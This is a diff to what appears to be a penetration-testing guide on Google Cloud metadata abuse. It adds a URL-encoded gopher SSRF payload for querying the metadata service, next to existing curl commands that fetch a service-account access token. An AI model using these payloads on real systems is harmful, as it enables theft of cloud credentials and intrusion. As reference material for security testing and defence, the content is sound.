@@ -149,6 +149,12 @@ If the client has a `/v1beta` enabled, you can get the access token without the 
 curl http://metadata.google.internal/computeMetadata/v1beta/instance/service-accounts/default/token
 ```
 
+If you have SSRF, check if the gopher protocol is enabled. It may be possible to query the metadata service with:
+
+```bash
+curl gopher://metadata.google.internal:80/xGET%2520/computeMetadata/v1/instance/%2520HTTP%252f%2531%252e%%2531%250AHost:%2520metadata.google.internal%250AAccept:%2520%252a%252f%252a%250aMetadata-Flavor:%2520Google%250d%250a
+```
+
 Otherwise, you must query [`http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token`](http://metadata.google.internal/computeMetadata/v1beta/instance/service-accounts/default/token) with a custom header set
 
 - note the authorization token expires within 1 hour by default
